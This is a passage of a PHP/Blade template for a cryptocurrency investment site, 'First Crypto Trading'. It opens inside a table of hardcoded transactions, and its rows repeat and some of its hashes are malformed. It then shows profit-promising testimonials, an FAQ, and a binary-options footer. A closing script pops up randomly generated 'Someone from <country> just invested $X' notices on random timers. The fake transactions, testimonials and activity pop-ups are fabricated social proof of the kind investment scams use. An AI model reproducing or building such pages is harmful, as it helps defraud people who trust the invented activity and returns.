				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
				  <td class="table-font">$4,000.00</td>
				  <td class="table-font">8a2b9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2</td>
				</tr>
				<tr>
				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
				  <td class="table-font">$500.00</td>
				  <td class="table-font">00db85ef40da34f3ea76aa60f0b2053eec2d90121e450791c18d8edbfedde6f1</td>
				</tr>
			   <tr>
				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
				  <td class="table-font">$240,000.00</td>
				  <td class="table-font">b21a418a44ed8b56118facefe7aa8d26541dff811b8a8ca65cfa1346d62c5c48</td>
				</tr>
				<tr>
				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
				  <td class="table-font">$17,000.00</td>
				  <td class="table-font">1e652d2899a1d058a20041a9faaeb5dc009101ca412ff09c387e6b281bd1db8b</td>
				</tr>
				<tr>
				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
				  <td class="table-font">$51,000.00</td>
				  <td class="table-font">6a49e66a66f75e72e6bd383ac798792af204a6693708912ad0d48e363a2ab7a7</td>
				</tr>
			   <tr>
				  <td class="table-font"><button class="button-table button2"><i class="fas fa-exclamation-triangle"></i> Pending</button></td>
				  <td class="table-font">$8,000.00</td>
				  <td class="table-font">7ac003e95ada3c584471ba5982e16c5dc2a6e464d3c170555ea8c708668be9383b</td>
				</tr>
			   
			   <tr>
				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
				  <td class="table-font">$16,000.00</td>
				  <td class="table-font">0067ab9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2</td>
				</tr>
				<tr>
				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
				  <td class="table-font">$14,000.00</td>
				  <td class="table-font">7a5ba039291417fdbdb411ea0a102d23090cde9ac7799ff605f40b5db484891d</td>
				</tr>
			   <tr>
				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
				  <td class="table-font">$1,000.00</td>
				  <td class="table-font">ab5cb66ce7a33bbc63bf50050beaf52be71709c359aa1d344bb90f943690485661</td>
				</tr>
				
				
				<tr>
				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
				  <td class="table-font">$21,000.00</td>
				  <td class="table-font">8a2b9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2</td>
				</tr>
				<tr>
				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
				  <td class="table-font">$6,000.00</td>
				  <td class="table-font">797ba039291417fdbdb411ea0a102d23090cde9ac7799ff605f40b5db484891d</td>
				</tr>
			   <tr>
				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
				  <td class="table-font">$9,000.00</td>
				  <td class="table-font">f0b66ce7a33bbc63bf50050beaf52be71709c359aa1d344bb90f943690485661</td>
				</tr>				
				<tr>
				  <td class="table-font"><button class="button-table button2"><i class="fas fa-exclamation-triangle"></i> Pending</button></td>
				  <td class="table-font">$23,000.00</td>
				  <td class="table-font">2083e95ada3c584471ba5982e16c5dc2a6e464d3c170555ea8c708668be9383b</td>
				</tr>
								<tr>
				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
				  <td class="table-font">$10,000.00</td>
				  <td class="table-font">3a17c5984af22cd7a443f14457841b3b19a51ea75a30e18bc6a82e4f8732dbca</td>
				</tr>
				<tr>
				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
				  <td class="table-font">$24,000.00</td>
				  <td class="table-font">f007e92cc9f82ba9c8c40c481eec7315fa9abcd85e7249a6cb57e38a2cf22d3e</td>
				</tr>
				
				<tr>
				  <td class="table-font"><button class="button-table button2"><i class="fas fa-exclamation-triangle"></i> Pending</button></td>
				  <td class="table-font">$3,000.00</td>
				  <td class="table-font">ab6c83e95ada3c584471ba5982e16c5dc2a6e464d3c170555ea8c708668be9383b</td>
				</tr>
				
			   <tr>
				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
				  <td class="table-font">$4,000.00</td>
				  <td class="table-font">8a2b9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2</td>
				</tr>
				<tr>
				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
				  <td class="table-font">$500.00</td>
				  <td class="table-font">00db85ef40da34f3ea76aa60f0b2053eec2d90121e450791c18d8edbfedde6f1</td>
				</tr>
			   <tr>
				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
				  <td class="table-font">$240,000.00</td>
				  <td class="table-font">b21a418a44ed8b56118facefe7aa8d26541dff811b8a8ca65cfa1346d62c5c48</td>
				</tr>
				<tr>
				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
				  <td class="table-font">$17,000.00</td>
				  <td class="table-font">1e652d2899a1d058a20041a9faaeb5dc009101ca412ff09c387e6b281bd1db8b</td>
				</tr>
				<tr>
				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
				  <td class="table-font">$51,000.00</td>
				  <td class="table-font">6a49e66a66f75e72e6bd383ac798792af204a6693708912ad0d48e363a2ab7a7</td>
				</tr>
			   <tr>
				  <td class="table-font"><button class="button-table button2"><i class="fas fa-exclamation-triangle"></i> Pending</button></td>
				  <td class="table-font">$8,000.00</td>
				  <td class="table-font">7ac003e95ada3c584471ba5982e16c5dc2a6e464d3c170555ea8c708668be9383b</td>
				</tr>
			   
			   <tr>
				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
				  <td class="table-font">$16,000.00</td>
				  <td class="table-font">0067ab9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2</td>
				</tr>
				<tr>
				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
				  <td class="table-font">$14,000.00</td>
				  <td class="table-font">7a5ba039291417fdbdb411ea0a102d23090cde9ac7799ff605f40b5db484891d</td>
				</tr>
			   <tr>
				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
				  <td class="table-font">$1,000.00</td>
				  <td class="table-font">ab5cb66ce7a33bbc63bf50050beaf52be71709c359aa1d344bb90f943690485661</td>
				</tr>
				
				
				<tr>
				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
				  <td class="table-font">$21,000.00</td>
				  <td class="table-font">8a2b9781aa4995625af7d2b008f020ac74e7e0d2a599e93ed995f7c3bc2be9f2</td>
				</tr>
				<tr>
				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
				  <td class="table-font">$6,000.00</td>
				  <td class="table-font">797ba039291417fdbdb411ea0a102d23090cde9ac7799ff605f40b5db484891d</td>
				</tr>
			   <tr>
				  <td class="table-font"><button class="button-table button1"><i class="fas fa-check"></i> Confirmed</button></td>
				  <td class="table-font">$9,000.00</td>
				  <td class="table-font">f0b66ce7a33bbc63bf50050beaf52be71709c359aa1d344bb90f943690485661</td>
				</tr>				
				<tr>
				  <td class="table-font"><button class="button-table button2"><i class="fas fa-exclamation-triangle"></i> Pending</button></td>
				  <td class="table-font">$23,000.00</td>
				  <td class="table-font">2083e95ada3c584471ba5982e16c5dc2a6e464d3c170555ea8c708668be9383b</td>
				</tr>

			  </table>
			</div>
			
			
			
			
			
			
			
			
			
			
            <div class="mobileapp-section p-tb black-bg white-sec">
                <div class="container">
                    <div class="row align-items-center flex-row-reverse">
                        <div class="col-lg-5">
                            <div class="iphone-img">
                                <img src="<?php echo e(asset ('home/images/mercury-iphone-img.png')); ?>" alt="">
                            </div>
                        </div>
                        <div class="col-lg-7">
                            <h2 class="section-heading">Don’t Miss Our App! It’s Free to Download for You,</h2>
                            <p>First Crypto Tradingis a top tier bitcoin invest­ment platform available every one. First Crypto Tradingis a modular Bitcoin full-node microservices API server architecture and utili­ties toolkit are built to be scalable</p>
                            <p>First Crypto Tradingis run by self-proclaimed Experts and Bitcoin Maximalists and it shows. As one of the top bitcoin invest­ment sites, they focus on privacy, security, and enabling users to maintain full custody of their Bitcoin.</p>
                            <div class="button-wrapper">
                                <a href="#" class="apple-btn">
                                    <img src="<?php echo e(asset ('home/images/app-store-btn.png')); ?>" alt="">
                                </a>
                                <a href="#" class="google-btn">
                                    <img src="<?php echo e(asset ('home/images/google-play-btn.png')); ?>" alt="">
                                </a>
                            </div>
                        </div>
                        
                    </div>
                </div>
            </div>
            <!-- Team sec start-->
            <div class="team-section p-tb light-gray-bg mercury-layout" id="team">
                <div class="container">
                    <div class="text-center"><h2 class="section-heading">Testimonials</h2></div>
                    <div class="row">
                        <div class="col-md-6 col-lg-3">
                            <div class="team-box">
                                <div class="team-img">
                                    <img src="<?php echo e(asset ('home/images/team-9.jpg')); ?>" alt="">
                                    
                                </div>
                                <div class="text">
                                    <h4>Andy S</h4>
                                    <span>Thank you so much it was a suprrise for me, I thought it was a waste of time and money you really supriesed me.</span>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-3">
                            <div class="team-box">
                                <div class="team-img">
                                    <img src="<?php echo e(asset ('home/images/team-10.jpg')); ?>" alt="">
                                    
                                </div>
                                <div class="text">
                                    <h4>Danny K</h4>
                                    <span>Couldn't believe until i got my first cash out.Thank for the time and guidiance you gave me throught my time on your plateform</span>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-3">
                            <div class="team-box">
                                <div class="team-img">
                                    <img src="<?php echo e(asset ('home/images/team-12.jpg')); ?>" alt="">
                                </div>
                                <div class="text">
                                    <h4>Saru M</h4>
                                    <span>It's amazing how fast it took for me invest so little and make so much, I now have enough for my morgage and my vacation to bahamas next thankgiving</span>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-6 col-lg-3">
                            <div class="team-box">
                                <div class="team-img">
                                    <img src="<?php echo e(asset ('home/images/team-11.jpg')); ?>" alt="">
                                </div>
                                <div class="text">
                                    <h4>Cyrus N</h4>
                                    <span>At first i was afriad of loosing everything but then i am so happy now. It wouldn't have been possible for your guidiance and the trust and assurance of words you gave me.</span>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- Team sec end-->
             <!-- FAQ Section start-->
            <div class="faq-section p-tb white-bg diamond-layout" id="faq">
                <div class="container">
                    <div class="text-center"><h2 class="section-heading">Frequently Asked Questions</h2></div>
                    <div class="row">
                        <div class="col-sm-12">
                            <!--Accordion wrapper-->
                            <div class="accordion md-accordion style-2" id="accordionEx" role="tablist" aria-multiselectable="true">
                                <!-- Accordion card -->
                                <div class="card">
                                    <!-- Card header -->
                                    <div class="card-header" role="tab" id="headingOne1">
                                        <a data-toggle="collapse" data-parent="#accordionEx" href="#collapseOne1" aria-expanded="true" aria-controls="collapseOne1">
                                            <h5 class="mb-0">
                                                When would I be able to see my balance? <i class="fas fa-caret-down rotate-icon"></i>
                                            </h5>
                                        </a>
                                    </div>
                                    <!-- Card body -->
                                    <div id="collapseOne1" class="collapse show" role="tabpanel" aria-labelledby="headingOne1" data-parent="#accordionEx">
                                        <div class="card-body">
                                           You can see your balance on your dashboard as each time according to your duration or lenght of investment day, most most likely after every 24 hours
                                        </div>
                                    </div>
                                </div>
                                <!-- Accordion card -->
                                <!-- Accordion card -->
                                <div class="card">
                                    <!-- Card header -->
                                    <div class="card-header" role="tab" id="headingTwo2">
                                        <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collapseTwo2" aria-expanded="false" aria-controls="collapseTwo2">
                                            <h5 class="mb-0">
                                                Is it possible for the citizens or residents of the US to participate in the Token Sale on your plateform
                                        </a>
                                    </div>
                                    <!-- Card body -->
                                    <div id="collapseTwo2" class="collapse" role="tabpanel" aria-labelledby="headingTwo2" data-parent="#accordionEx">
                                        <div class="card-body">
                                          Everyone from every city, country and nation are welcome on our plateform there are restrictions to visitor, but all user are adviced to follow the nessecary guideline to able to maintain continuity
                                        </div>
                                    </div>
                                </div>
                                <!-- Accordion card -->
                                <!-- Accordion card -->
                                <div class="card">
                                    <!-- Card header -->
                                    <div class="card-header" role="tab" id="headingThree3">
                                        <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collapseThree3" aria-expanded="false" aria-controls="collapseThree3">
                                            <h5 class="mb-0">
                                                Is there a KYC process involved? <i class="fas fa-caret-down rotate-icon"></i>
                                            </h5>
                                        </a>
                                    </div>
                                    <!-- Card body -->
                                    <div id="collapseThree3" class="collapse" role="tabpanel" aria-labelledby="headingThree3" data-parent="#accordionEx">
                                        <div class="card-body">
                                           KYC  are regulation needed for verification and to ensure no user is automating the process of investment there fore whenever the arises you may be required to submit perosnal information to verify you identifity only when needed.
                                        </div>
                                    </div>
                                </div>
                                <!-- Accordion card -->
                                <!-- Accordion card -->
                                <div class="card">
                                    <!-- Card header -->
                                    <div class="card-header" role="tab" id="headingFour4">
                                        <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collapseFour4" aria-expanded="false" aria-controls="collapseFour4">
                                            <h5 class="mb-0">
                                                What will happen to the un withdrawn balance ? <i class="fas fa-caret-down rotate-icon"></i>
                                            </h5>
                                        </a>
                                    </div>
                                    <!-- Card body -->
                                    <div id="collapseFour4" class="collapse" role="tabpanel" aria-labelledby="headingFour4" data-parent="#accordionEx">
                                        <div class="card-body">
                                            Un-withdrawn balance are left in your dashbaord until anytime you are ready to withdraw them
                                        </div>
                                    </div>
                                </div>
                                <!-- Accordion card -->
                                <!-- Accordion card -->
                                <div class="card">
                                    <!-- Card header -->
                                    <div class="card-header" role="tab" id="headingFive5">
                                        <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collapseFive5" aria-expanded="false" aria-controls="collapseFive5">
                                            <h5 class="mb-0">
                                                Which cryptocurrencies can I use to participate in Investment? <i class="fas fa-caret-down rotate-icon"></i>
                                            </h5>
                                        </a>
                                    </div>
                                    <!-- Card body -->
                                    <div id="collapseFive5" class="collapse" role="tabpanel" aria-labelledby="headingFive5" data-parent="#accordionEx">
                                        <div class="card-body">
                                           The default Crypto currency need for investment in First Crypto Tradingis the bitcoin currency.
                                        </div>
                                    </div>
                                </div>
                                <!-- Accordion card -->
                                <!-- Accordion card -->
                                <div class="card">
                                    <!-- Card header -->
                                    <div class="card-header" role="tab" id="headingSix6">
                                        <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collapseSix6" aria-expanded="false" aria-controls="collapseSix6">
                                            <h5 class="mb-0">
                                                Are there any restrictions that involve a minimum or a maximum transaction limit? <i class="fas fa-caret-down rotate-icon"></i>
                                            </h5>
                                        </a>
                                    </div>
                                    <!-- Card body -->
                                    <div id="collapseSix6" class="collapse" role="tabpanel" aria-labelledby="headingSix6" data-parent="#accordionEx">
                                        <div class="card-body">
                                            No retriction are involved here on our plateform only except when notified by email
                                        </div>
                                    </div>
                                </div>
                                <!-- Accordion card -->
                                <!-- Accordion card --
                                <div class="card">
                                    <!-- Card header --
                                    <div class="card-header" role="tab" id="headingSeven7">
                                        <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collapseSeven7" aria-expanded="false" aria-controls="collapseSeven7">
                                            <h5 class="mb-0">
                                                Where is the company registered? Where is the Coinpool office located? <i class="fas fa-caret-down rotate-icon"></i>
                                            </h5>
                                        </a>
                                    </div>
                                    <!-- Card body --
                                    <div id="collapseSeven7" class="collapse" role="tabpanel" aria-labelledby="headingSeven7" data-parent="#accordionEx">
                                        <div class="card-body">
                                            Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean cursus tincidunt ultrices. Ut quis blandit dolor. Ut laoreet sagittis arcu eu tristique.  Ut quis blandit dolor. Ut laoreet sagittis arcu eu tristique. Lorem ipsum dolor sit amet, consectetur adipiscing elit. Aenean cursus tincidunt ultrices.
                                        </div>
                                    </div>
                                </div>
                                <!-- Accordion card -->

                            </div>
                            <!-- Accordion wrapper -->
                        </div>
                    </div>
                </div>
            </div>
            <!-- FAQ Section end--> 
            <!-- Brand logo slider -->
            <div class="brand-logo-slider c-l p-tb white-sec">
                <div class="container">
                    <div class="text-center"><h2 class="section-heading">Our Partners</h2></div>
                    <div class="brand-logos owl-carousel">
                        <div class="item"><img src="<?php echo e(asset ('home/images/brand-logo1.png')); ?>" alt="Brand Logo 1" /></div>
                        <div class="item"><img src="<?php echo e(asset ('home/images/brand-logo2.png')); ?>" alt="Brand Logo 2" /></div>
                        <div class="item"><img src="<?php echo e(asset ('home/images/brand-logo5.png')); ?>" alt="Brand Logo 5" /></div>
                        <div class="item"><img src="<?php echo e(asset ('home/images/brand-logo4.png')); ?>" alt="Brand Logo 4" /></div>
                        <div class="item"><img src="<?php echo e(asset ('home/images/brand-logo3.png')); ?>" alt="Brand Logo 3" /></div>
                    </div>
                </div>
            </div>
            <!-- Brand logo end -->
        </div>
        <!-- Content Section End -->   
        <div class="clear"></div>
        <!--footer Start-->   
        <footer class="footer-3">
            <div class="container">
                <div class="row">
                    <div class="col-md-4 footer-box-1">
                        <div class="footer-logo">
                            <a href="#" title=""><img src="logo-3.png" alt="Cp Silver"></a>
                        </div>
                        <p>Trading binary options is the latest way to trade global markets. It is a form of trading that allows you to earn maximum profit with minimal investment of time and money. Binary options have opened up financial markets to people around the entire world.</p>
                    </div>
                    <div class="col-md-3 footer-box-2">
                        <ul class="footer-menu onepage">
							 <li><a href="#top">Home</a></li>
                             <li><a href="#about">About Us</a></li>
                             <li><a href="#token">Equities</a></li>
                             <li><a href="#team">Testimonials</a></li>
                             <li><a href="#contact">Contact Us</a></li>
                        </ul>
                    </div>
                    <div class="col-md-5 footer-box-3">
                        <h4>Newsletter</h4>
                        <p>Keep up to date with our progress. Subscribe for e-mail updates.</p>
                        <div class="newsletter">
                            <form>
                                <div class="input"><input type="email" name="Email" placeholder="Your email address"></div>
                                <div class="submit"><input class="btn" type="submit" name="subscribe" value="subscribe"></div>
                            </form>
                        </div>
                        <div class="socials">
                            <ul>
                                <li><a href="https://facebook.com/"><i class="fab fa-facebook-f"></i></a></li>
                                <li><a href="https://twitter.com/"><i class="fab fa-twitter"></i></a></li>
                                <li><a href="https://plus.google.com/"><i class="fab fa-google-plus-g"></i></a></li>
                                <li><a href="https://www.youtube.com/"><i class="fab fa-youtube"></i></a></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </footer>
        <!--footer end--> 
    </div>
    <!--Main Wrapper End-->
 
 
					<body>
					 
					  
					<div id="capitol-callback">
					  <div class="cpt-circle"></div>
					  <div class="cpt-circle-fill"></div>
					  <a href="https://api.whatsapp.com/send?phone=<?php echo e($settings->whatsapp); ?>&text= Hello <?php echo e($settings->site_name); ?>" id="WhatsAppBtnDesktop" target="_blank" class="main-button" lang="en">
						<img src="https://nhtagent.com/nht-upload/assets/javascripts/WhatsApp/WhatsApp.png" width="100%">
					  </a>
					</div>







 
 
 
 
 
    <script> 
        var $el = $(".table-style");
        function anim() {
        var st = $el.scrollTop();
        var sb = $el.prop("scrollHeight")-$el.innerHeight();
        $el.animate({scrollTop: st<sb/2 ? sb : 0}, 48000, anim);
        }
        function stop(){
        $el.stop();
        }
        anim();
        $el.hover(stop, anim);
	</script>
 
 
 
 
 
 
 
    <!-- <script src="//code.tidio.co/ci6qia0f7wnluimwdg2nc3ygf0vqeust.js" async></script> -->
    <script src="<?php echo e(asset('home/js/jquery.min.js')); ?>"></script>
    <script src="<?php echo e(asset('home/js/bootstrap.min.js')); ?>"></script>
    <script src="<?php echo e(asset('home/js/onpagescroll.js')); ?>"></script>
    <script src="<?php echo e(asset('home/js/wow.min.js')); ?>"></script>
    <script src="<?php echo e(asset('home/js/jquery.countdown.js')); ?>"></script>
    <script src="<?php echo e(asset('home/js/owl.carousel.js')); ?>"></script>
     <script type="text/javascript">
        function isScrolledIntoView(elem) {
            var docViewTop = jQuery(window).scrollTop();
            var docViewBottom = docViewTop + jQuery(window).height();
            var elemTop = jQuery(elem).offset().top;
            var elemBottom = elemTop + jQuery(elem).height();
            return ((elemBottom <= docViewBottom) && (elemTop >= docViewTop));
        }
        jQuery(window).scroll(function () {
            jQuery('.about-mercury-animation').each(function () {
                if (isScrolledIntoView(this) === true) {
                    jQuery(this).addClass('visible');
                }
            });
            jQuery('.token-pricing-section').each(function () {
                if (isScrolledIntoView(this) === true) {
                    jQuery(this).addClass('visible');
                }
            });
        });
        jQuery(document).ready(function () {
            jQuery('.allocation-list-point li:first-child').addClass('hover');
            jQuery('.allocation-list-point li .point').hover(function(){
                jQuery('.allocation-list-point li').removeClass('hover');
                jQuery(this).parent('li').addClass('hover');
            });
        });
    </script>
	
    
    <div class="mgm" style="display: none;">
        <div class="txt" style="color:black;"></div>

        <script type="text/javascript">
            var listCountries = ['South Africa', 'USA', 'Germany', 'France', 'Italy', 'South Africa', 'Australia', 'South Africa', 'Canada', 'Argentina', 'Saudi Arabia', 'Mexico', 'South Africa', 'South Africa', 'Venezuela', 'South Africa', 'Sweden', 'South Africa', 'South Africa', 'Italy', 'South Africa', 'United Kingdom', 'South Africa', 'Greece', 'Cuba', 'South Africa', 'Portugal', 'Austria', 'South Africa', 'Panama', 'South Africa', 'South Africa', 'Netherlands', 'Switzerland', 'Belgium', 'Israel', 'Cyprus'];
            var listPlans = ['$500','$1,500','$1,000','$10,000','$2,000','$3,000','$4,000', '$600', '$700', '$2,500'];
            var transarray = ['just <b>invested</b> with', 'just <b>withdrew</b>', 'just <b>earned</b>', 'is <b>trading with</b>'];
            interval = Math.floor(Math.random() * (40000 - 8000 + 1) + 8000);
            var run = setInterval(request, interval);
        
            function request() {
                clearInterval(run);
                interval = Math.floor(Math.random() * (40000 - 8000 + 1) + 8000);
                var country = listCountries[Math.floor(Math.random() * listCountries.length)];
                var transtype = transarray[Math.floor(Math.random() * transarray.length)];
                // var plan = listPlans[Math.floor(Math.random() * listPlans.length)];
                var plan = `$${(Math.ceil((Math.floor(Math.random() * 50000) + 500) * 100) / 100).toLocaleString()}`;
                var msg = `Someone from <b> ${country} </b> ${transtype} <b style="color:blue;"> ${plan} </b>`;
                $(".mgm .txt").html(msg);
                $(".mgm").stop(true).fadeIn(1000);
                window.setTimeout(function() {
                    $(".mgm").stop(true).fadeOut(2000);
                }, 10000);
                run = setInterval(request, interval);

            }
        </script>
    </div>

</body>

</html>